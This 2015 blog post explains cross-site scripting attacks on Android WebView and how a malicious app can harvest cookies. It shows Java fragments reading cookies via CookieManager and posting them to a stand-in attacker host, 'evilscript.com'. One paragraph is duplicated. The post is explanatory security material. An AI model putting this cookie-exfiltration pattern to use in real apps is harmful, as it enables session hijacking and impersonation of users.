+++
author = "Bhavani Anantapur Bache"
title = "Is your data in Android device safe??? – Cross Site Scripting attacks on Android WebView"
date = "2015-07-07"
description = "Is your data in Android device safe??? – Cross Site Scripting attacks on Android WebView"
featured = true
tags = [
    "Programming",
    "Android",
    "Embedded Systems",
]
categories = [
    "Programming",
    "Android",
    "Embedded Systems"
]
series = ["Embedded Systems"]
aliases = ["migrate-from-jekyl"]
thumbnail = "images/malicious-android.jpg"
+++
Many of the Android applications display web content and also interact with it. This is possible by exposing a web browser as a standalone component and embedding it in the application. Such a component is called as WebView. WebView uses a number of APIs which can interact with the web contents inside WebView. In the current blog-post, Cross-site scripting attacks or XSS attacks specific to Android WebView are discussed.
<h3>What is Cross-site Scripting?(XSS)</h3>
Cross-site scripting (XSS) is a type of computer security vulnerability typically found in Web Applications. To protect the user’s environment from malicious code, browsers use a sand-boxing mechanism that limits a script to access only resources associated with its origin site. Unfortunately, these security mechanisms fail if a user unknowingly executes a malicious script from an intermediate, trusted site. In this case, the malicious script is granted full access to all resources (e.g. Authentication tokens and cookies) that belong to the trusted site. Such attacks are called cross-site scripting (XSS) attacks.

<h3>How are Cross-site scripting attacks possible in Android?</h3>
By finding ways of executing malicious scripts through the third party malicious app on phone, an attacker can gain elevated access-privileges to sensitive page content, session cookies, and a variety of other information in the phone such as contacts.

<h3>Cross site Scripting by stealing cookies from user’s device</h3>
The most common behavior of XSS attacks is to gather cookies. Cookies are small text files that reside on a user’s computer and store name-value pairs along with some metadata. Cookies are commonly used to store information intended to be persistent during a browser session or from session to session, such as session IDs, user preferences, or login information.

![alt text](images/rgbcolorspace1.png "Logo Title Text 1")

When the user runs the application through the WebView, Android applications can monitor the events occurred within WebView. Cookies can be gathered at every page navigation of the user using the method getCookie() from CookieManager class as shown in the code fragment below.
````java
CookieManager cookieManager = CookieManager.getInstance();
final string cookie = cookieManager.getCookie(url);
````

Through HttpPost, malicious script can be run on the user’s Android device, cookies and URL can be sent to any third party (i.e., the attacker’s server), thus avoiding the same-origin policy or cookie protection mechanism.

````java
HttpClient httpClient = new DefaultHttpClient();
HttpPost httpPost = new HttpPost(“http://evilscript.com/androidCookie.php”);
````
The attacker is now able get all the cookies and will be able to launch several attacks such a Session Hijacking and impersonating user using stolen cookies. The attacks described above are quite dangerous as the user sees only the trusted content and is not aware that his cookies are being stolen. The attack is shown in the figure.

The attacker is now able get all the cookies and will be able to launch several attacks such a Session Hijacking and impersonating user using stolen cookies. The attacks described above are quite dangerous as the user sees only the trusted content and is not aware that his cookies are being stolen.

NOTE: Please see the [research publication]("http://ijcsn.org/IJCSN-2013/2-2/IJCSN-2013-2-2-03.pdf") for details.
